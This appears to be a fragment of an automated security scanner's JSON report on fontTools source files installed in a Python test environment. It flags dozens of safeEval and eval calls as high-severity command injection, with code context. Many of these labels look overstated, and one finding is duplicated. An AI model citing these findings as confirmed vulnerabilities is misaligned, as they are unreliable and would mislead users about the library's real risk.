            "context": "            self.values = array.array(\"h\")\n        if name == \"cv\":\n            index = safeEval(attrs[\"index\"])\n            value = safeEval(attrs[\"value\"])\n            for i in range(1 + index - len(self.values)):\n                self.values.append(0)\n            self.values[index] = value",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S_I_N_G_.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "METAMD5List = eval(self.METAMD5)",
            "context": "        d = self.__dict__.copy()\n        d[\"nameLength\"] = bytechr(len(self.baseGlyphName))\n        d[\"uniqueName\"] = self.compilecompileUniqueName(self.uniqueName, 28)\n        METAMD5List = eval(self.METAMD5)\n        d[\"METAMD5\"] = b\"\"\n        for val in METAMD5List:\n            d[\"METAMD5\"] += bytechr(val)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S_I_N_G_.py",
            "line": 99,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "        if name in [\"uniqueName\", \"METAMD5\", \"baseGlyphName\"]:\n            setattr(self, name, value)\n        else:\n            setattr(self, name, safeEval(value))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 276,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(glyph, attr, safeEval(attrs.get(attr, \"0\")))",
            "context": "        log.debug(\"unpacking glyph '%s'\", glyphName)\n        glyph = Glyph()\n        for attr in [\"xMin\", \"yMin\", \"xMax\", \"yMax\"]:\n            setattr(glyph, attr, safeEval(attrs.get(attr, \"0\")))\n        self.glyphs[glyphName] = glyph\n        for element in content:\n            if not isinstance(element, tuple):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 795,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))",
            "context": "                name, attrs, content = element\n                if name != \"pt\":\n                    continue  # ignore anything but \"pt\"\n                coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))\n                flag = bool(safeEval(attrs[\"on\"]))\n                if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):\n                    flag |= flagOverlapSimple",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 795,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))",
            "context": "                name, attrs, content = element\n                if name != \"pt\":\n                    continue  # ignore anything but \"pt\"\n                coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))\n                flag = bool(safeEval(attrs[\"on\"]))\n                if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):\n                    flag |= flagOverlapSimple",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 796,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "flag = bool(safeEval(attrs[\"on\"]))",
            "context": "                if name != \"pt\":\n                    continue  # ignore anything but \"pt\"\n                coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))\n                flag = bool(safeEval(attrs[\"on\"]))\n                if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):\n                    flag |= flagOverlapSimple\n                if \"cubic\" in attrs and bool(safeEval(attrs[\"cubic\"])):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 797,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):",
            "context": "                    continue  # ignore anything but \"pt\"\n                coordinates.append((safeEval(attrs[\"x\"]), safeEval(attrs[\"y\"])))\n                flag = bool(safeEval(attrs[\"on\"]))\n                if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):\n                    flag |= flagOverlapSimple\n                if \"cubic\" in attrs and bool(safeEval(attrs[\"cubic\"])):\n                    flag |= flagCubic",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 799,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if \"cubic\" in attrs and bool(safeEval(attrs[\"cubic\"])):",
            "context": "                flag = bool(safeEval(attrs[\"on\"]))\n                if \"overlap\" in attrs and bool(safeEval(attrs[\"overlap\"])):\n                    flag |= flagOverlapSimple\n                if \"cubic\" in attrs and bool(safeEval(attrs[\"cubic\"])):\n                    flag |= flagCubic\n                flags.append(flag)\n            if not hasattr(self, \"coordinates\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 1917,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.firstPt = safeEval(attrs[\"firstPt\"])",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        self.glyphName = attrs[\"glyphName\"]\n        if \"firstPt\" in attrs:\n            self.firstPt = safeEval(attrs[\"firstPt\"])\n            self.secondPt = safeEval(attrs[\"secondPt\"])\n        else:\n            self.x = safeEval(attrs[\"x\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 1918,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.secondPt = safeEval(attrs[\"secondPt\"])",
            "context": "        self.glyphName = attrs[\"glyphName\"]\n        if \"firstPt\" in attrs:\n            self.firstPt = safeEval(attrs[\"firstPt\"])\n            self.secondPt = safeEval(attrs[\"secondPt\"])\n        else:\n            self.x = safeEval(attrs[\"x\"])\n            self.y = safeEval(attrs[\"y\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 1920,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.x = safeEval(attrs[\"x\"])",
            "context": "            self.firstPt = safeEval(attrs[\"firstPt\"])\n            self.secondPt = safeEval(attrs[\"secondPt\"])\n        else:\n            self.x = safeEval(attrs[\"x\"])\n            self.y = safeEval(attrs[\"y\"])\n        if \"scale01\" in attrs:\n            scalex = str2fl(attrs[\"scalex\"], 14)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 1921,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.y = safeEval(attrs[\"y\"])",
            "context": "            self.secondPt = safeEval(attrs[\"secondPt\"])\n        else:\n            self.x = safeEval(attrs[\"x\"])\n            self.y = safeEval(attrs[\"y\"])\n        if \"scale01\" in attrs:\n            scalex = str2fl(attrs[\"scalex\"], 14)\n            scale01 = str2fl(attrs[\"scale01\"], 14)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_l_y_f.py",
            "line": 1935,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.flags = safeEval(attrs[\"flags\"])",
            "context": "        elif \"scale\" in attrs:\n            scale = str2fl(attrs[\"scale\"], 14)\n            self.transform = [[scale, 0], [0, scale]]\n        self.flags = safeEval(attrs[\"flags\"])\n\n    def __eq__(self, other):\n        if type(self) != type(other):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.tableVersion = safeEval(attrs[\"version\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"tableVersion\":\n            self.tableVersion = safeEval(attrs[\"version\"])\n            return\n        if name[:12] != \"cmap_format_\":\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 244,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "format = safeEval(name[12:])",
            "context": "            return\n        if not hasattr(self, \"tables\"):\n            self.tables = []\n        format = safeEval(name[12:])\n        table = CmapSubtable.newSubtable(format)\n        table.platformID = safeEval(attrs[\"platformID\"])\n        table.platEncID = safeEval(attrs[\"platEncID\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "table.platformID = safeEval(attrs[\"platformID\"])",
            "context": "            self.tables = []\n        format = safeEval(name[12:])\n        table = CmapSubtable.newSubtable(format)\n        table.platformID = safeEval(attrs[\"platformID\"])\n        table.platEncID = safeEval(attrs[\"platEncID\"])\n        table.fromXML(name, attrs, content, ttFont)\n        self.tables.append(table)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 247,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "table.platEncID = safeEval(attrs[\"platEncID\"])",
            "context": "        format = safeEval(name[12:])\n        table = CmapSubtable.newSubtable(format)\n        table.platformID = safeEval(attrs[\"platformID\"])\n        table.platEncID = safeEval(attrs[\"platEncID\"])\n        table.fromXML(name, attrs, content, ttFont)\n        self.tables.append(table)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 419,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.language = safeEval(attrs[\"language\"])",
            "context": "        return data\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.language = safeEval(attrs[\"language\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}\n        cmap = self.cmap",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 429,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]",
            "context": "            name, attrs, content = element\n            if name != \"map\":\n                continue\n            cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]\n\n\nsubHeaderFormat = \">HHhH\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 772,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.language = safeEval(attrs[\"language\"])",
            "context": "        return data\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.language = safeEval(attrs[\"language\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}\n        cmap = self.cmap",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 783,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]",
            "context": "            name, attrs, content = element\n            if name != \"map\":\n                continue\n            cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]\n\n\ncmap_format_4_format = \">7H\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1055,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.language = safeEval(attrs[\"language\"])",
            "context": "        return header + data\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.language = safeEval(attrs[\"language\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}\n        cmap = self.cmap",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1066,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cmap[safeEval(attrsMap[\"code\"])] = attrsMap[\"name\"]",
            "context": "            nameMap, attrsMap, dummyContent = element\n            if nameMap != \"map\":\n                assert 0, \"Unrecognized keyword in cmap subtable\"\n            cmap[safeEval(attrsMap[\"code\"])] = attrsMap[\"name\"]\n\n\nclass cmap_format_6(CmapSubtable):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1122,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.language = safeEval(attrs[\"language\"])",
            "context": "        return header + data\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.language = safeEval(attrs[\"language\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}\n        cmap = self.cmap",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1133,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]",
            "context": "            name, attrs, content = element\n            if name != \"map\":\n                continue\n            cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]\n\n\nclass cmap_format_12_or_13(CmapSubtable):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1290,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.format = safeEval(attrs[\"format\"])",
            "context": "        writer.newline()\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.format = safeEval(attrs[\"format\"])\n        self.reserved = safeEval(attrs[\"reserved\"])\n        self.length = safeEval(attrs[\"length\"])\n        self.language = safeEval(attrs[\"language\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1291,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.reserved = safeEval(attrs[\"reserved\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        self.format = safeEval(attrs[\"format\"])\n        self.reserved = safeEval(attrs[\"reserved\"])\n        self.length = safeEval(attrs[\"length\"])\n        self.language = safeEval(attrs[\"language\"])\n        self.nGroups = safeEval(attrs[\"nGroups\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1292,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.length = safeEval(attrs[\"length\"])",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        self.format = safeEval(attrs[\"format\"])\n        self.reserved = safeEval(attrs[\"reserved\"])\n        self.length = safeEval(attrs[\"length\"])\n        self.language = safeEval(attrs[\"language\"])\n        self.nGroups = safeEval(attrs[\"nGroups\"])\n        if not hasattr(self, \"cmap\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1293,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.language = safeEval(attrs[\"language\"])",
            "context": "        self.format = safeEval(attrs[\"format\"])\n        self.reserved = safeEval(attrs[\"reserved\"])\n        self.length = safeEval(attrs[\"length\"])\n        self.language = safeEval(attrs[\"language\"])\n        self.nGroups = safeEval(attrs[\"nGroups\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1294,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.nGroups = safeEval(attrs[\"nGroups\"])",
            "context": "        self.reserved = safeEval(attrs[\"reserved\"])\n        self.length = safeEval(attrs[\"length\"])\n        self.language = safeEval(attrs[\"language\"])\n        self.nGroups = safeEval(attrs[\"nGroups\"])\n        if not hasattr(self, \"cmap\"):\n            self.cmap = {}\n        cmap = self.cmap",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1305,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]",
            "context": "            name, attrs, content = element\n            if name != \"map\":\n                continue\n            cmap[safeEval(attrs[\"code\"])] = attrs[\"name\"]\n\n\nclass cmap_format_12(cmap_format_12_or_13):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1456,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "uvs = safeEval(attrs[\"uvs\"])",
            "context": "            name, attrs, content = element\n            if name != \"map\":\n                continue\n            uvs = safeEval(attrs[\"uvs\"])\n            uv = safeEval(attrs[\"uv\"])\n            gname = attrs.get(\"name\")\n            if gname == \"None\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_m_a_p.py",
            "line": 1457,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "uv = safeEval(attrs[\"uv\"])",
            "context": "            if name != \"map\":\n                continue\n            uvs = safeEval(attrs[\"uvs\"])\n            uv = safeEval(attrs[\"uv\"])\n            gname = attrs.get(\"name\")\n            if gname == \"None\":\n                if _hasGlyphNamedNone is None:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_a_v_a_r.py",
            "line": 124,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.majorVersion = safeEval(attrs[\"major\"])",
            "context": "        if not hasattr(self.table, \"Reserved\"):\n            self.table.Reserved = 0\n        if name == \"version\":\n            self.majorVersion = safeEval(attrs[\"major\"])\n            self.minorVersion = safeEval(attrs[\"minor\"])\n            self.table.Version = (getattr(self, \"majorVersion\", 1) << 16) | getattr(\n                self, \"minorVersion\", 0",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_a_v_a_r.py",
            "line": 125,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.minorVersion = safeEval(attrs[\"minor\"])",
            "context": "            self.table.Reserved = 0\n        if name == \"version\":\n            self.majorVersion = safeEval(attrs[\"major\"])\n            self.minorVersion = safeEval(attrs[\"minor\"])\n            self.table.Version = (getattr(self, \"majorVersion\", 1) << 16) | getattr(\n                self, \"minorVersion\", 0\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 140,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name in [\"ppem\", \"resolution\"]:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n        elif name == \"glyph\":\n            if \"graphicType\" in attrs:\n                myFormat = safeEval(\"'''\" + attrs[\"graphicType\"] + \"'''\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 143,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "myFormat = safeEval(\"'''\" + attrs[\"graphicType\"] + \"'''\")",
            "context": "            setattr(self, name, safeEval(attrs[\"value\"]))\n        elif name == \"glyph\":\n            if \"graphicType\" in attrs:\n                myFormat = safeEval(\"'''\" + attrs[\"graphicType\"] + \"'''\")\n            else:\n                myFormat = None\n            if \"glyphname\" in attrs:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "myGlyphName = safeEval(\"'''\" + attrs[\"glyphname\"] + \"'''\")",
            "context": "            else:\n                myFormat = None\n            if \"glyphname\" in attrs:\n                myGlyphName = safeEval(\"'''\" + attrs[\"glyphname\"] + \"'''\")\n            elif \"name\" in attrs:\n                myGlyphName = safeEval(\"'''\" + attrs[\"name\"] + \"'''\")\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 149,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "myGlyphName = safeEval(\"'''\" + attrs[\"name\"] + \"'''\")",
            "context": "            if \"glyphname\" in attrs:\n                myGlyphName = safeEval(\"'''\" + attrs[\"glyphname\"] + \"'''\")\n            elif \"name\" in attrs:\n                myGlyphName = safeEval(\"'''\" + attrs[\"name\"] + \"'''\")\n            else:\n                from fontTools import ttLib\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 155,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "myOffsetX = safeEval(attrs[\"originOffsetX\"])",
            "context": "\n                raise ttLib.TTLibError(\"Glyph must have a glyph name.\")\n            if \"originOffsetX\" in attrs:\n                myOffsetX = safeEval(attrs[\"originOffsetX\"])\n            else:\n                myOffsetX = 0\n            if \"originOffsetY\" in attrs:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixStrike.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "myOffsetY = safeEval(attrs[\"originOffsetY\"])",
            "context": "            else:\n                myOffsetX = 0\n            if \"originOffsetY\" in attrs:\n                myOffsetY = safeEval(attrs[\"originOffsetY\"])\n            else:\n                myOffsetY = 0\n            current_glyph = Glyph(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_v_h_e_a.py",
            "line": 130,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "        if name == \"tableVersion\":\n            setattr(self, name, ve2fi(attrs[\"value\"]))\n            return\n        setattr(self, name, safeEval(attrs[\"value\"]))\n\n    # reserved0 is caretOffset for legacy reasons\n    @property",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otBase.py",
            "line": 952,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if conv.aux and not eval(conv.aux, None, self.__dict__):",
            "context": "                    if propagator and conv.repeat in propagator:\n                        propagator[conv.repeat].setValue(countValue)\n            else:\n                if conv.aux and not eval(conv.aux, None, self.__dict__):\n                    continue\n                if hasattr(self, conv.name):\n                    continue  # Warn if it should NOT be present?!",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otBase.py",
            "line": 990,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if conv.aux and not eval(conv.aux, None, table):",
            "context": "                    countValue += conv.aux\n                    table[conv.name] = conv.readArray(reader, font, table, countValue)\n                else:\n                    if conv.aux and not eval(conv.aux, None, table):\n                        continue\n                    table[conv.name] = conv.read(reader, font, table)\n                    if conv.isPropagated:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otBase.py",
            "line": 1094,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if conv.aux and not eval(conv.aux, None, table):",
            "context": "                )\n                writer[\"LookupType\"] = ref\n            else:\n                if conv.aux and not eval(conv.aux, None, table):\n                    continue\n                try:\n                    conv.write(writer, font, table, value)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otBase.py",
            "line": 1137,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if conv.aux and not eval(conv.aux, None, vars(self)):",
            "context": "                    item = value[i]\n                    conv.xmlWrite(xmlWriter, font, item, conv.name, [(\"index\", i)])\n            else:\n                if conv.aux and not eval(conv.aux, None, vars(self)):\n                    continue\n                value = getattr(\n                    self, conv.name, None",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/C_P_A_L_.py",
            "line": 268,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "labelIndex = safeEval(elementAttr[\"index\"])",
            "context": "                    continue\n                elementName, elementAttr, _ = element\n                if elementName == \"label\":\n                    labelIndex = safeEval(elementAttr[\"index\"])\n                    nameID = safeEval(elementAttr[\"value\"])\n                    colorLabels[labelIndex] = nameID\n            self.paletteEntryLabels = [",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/C_P_A_L_.py",
            "line": 269,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "nameID = safeEval(elementAttr[\"value\"])",
            "context": "                elementName, elementAttr, _ = element\n                if elementName == \"label\":\n                    labelIndex = safeEval(elementAttr[\"index\"])\n                    nameID = safeEval(elementAttr[\"value\"])\n                    colorLabels[labelIndex] = nameID\n            self.paletteEntryLabels = [\n                colorLabels.get(i, self.NO_NAME_ID)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/C_P_A_L_.py",
            "line": 276,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(attrs[\"value\"])",
            "context": "                for i in range(self.numPaletteEntries)\n            ]\n        elif \"value\" in attrs:\n            value = safeEval(attrs[\"value\"])\n            setattr(self, name, value)\n            if name == \"numPaletteEntries\":\n                self.paletteEntryLabels = [self.NO_NAME_ID] * self.numPaletteEntries",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 316,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, k, int(safeEval(attrs[k])))",
            "context": "def getSimple(self, attrs, *attr_list):\n    for k in attr_list:\n        if k in attrs:\n            setattr(self, k, int(safeEval(attrs[k])))\n\n\ndef content_string(contents):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 415,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.scheme = int(safeEval(attrs[\"compressionScheme\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.scheme = int(safeEval(attrs[\"compressionScheme\"]))\n            self.version = float(safeEval(attrs[\"version\"]))\n            self.compilerVersion = int(safeEval(attrs[\"compilerVersion\"]))\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 416,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = float(safeEval(attrs[\"version\"]))",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.scheme = int(safeEval(attrs[\"compressionScheme\"]))\n            self.version = float(safeEval(attrs[\"version\"]))\n            self.compilerVersion = int(safeEval(attrs[\"compilerVersion\"]))\n            return\n        if name == \"silf\":",
            "cvss_score": 7.5
          },
          {
